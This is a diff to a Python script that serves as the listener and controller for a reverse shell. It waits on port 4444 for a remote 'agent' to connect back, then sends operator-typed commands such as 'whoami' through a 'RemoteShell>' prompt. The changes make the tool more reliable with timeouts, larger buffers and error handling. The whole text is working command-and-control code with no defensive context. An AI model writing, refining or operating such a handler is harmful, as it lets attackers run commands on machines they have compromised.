@@ -1,11 +1,11 @@
 import socket
 
-# Configuration
-LHOST = '0.0.0.0' # Listen on all network interfaces
-LPORT = 4444      # The port the agent will call back to
+
+LHOST = '0.0.0.0' 
+LPORT = 4444      
 
 def start_controller():
-    # Create a socket and bind it to the port
+
     listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     listener.bind((LHOST, LPORT))
@@ -16,23 +16,32 @@ def start_controller():
     client, addr = listener.accept()
     print(f"[*] CONNECTION ESTABLISHED FROM: {addr[0]}")
     
-    # Receive the initial prompt
-    print(client.recv(1024).decode())
+
+    try:
+        client.settimeout(2.0)
+        print(client.recv(4096).decode())
+    except:
+        pass
+    client.settimeout(None)
 
     while True:
         try:
-            # Type a command (e.g., 'dir', 'whoami', 'hostname')
+
             cmd = input("RemoteShell> ")
             if cmd.lower() in ['exit', 'quit']:
                 client.close()
                 break
             
             if len(cmd) > 0:
-                client.send(cmd.encode())
-                response = client.recv(4096).decode()
+                client.send((cmd + "\n").encode())
+
+                response = client.recv(16384).decode()
                 print(response)
         except KeyboardInterrupt:
             client.close()
+            break
+        except Exception as e:
+            print(f"Error: {e}")
             break
 
 if __name__ == "__main__":
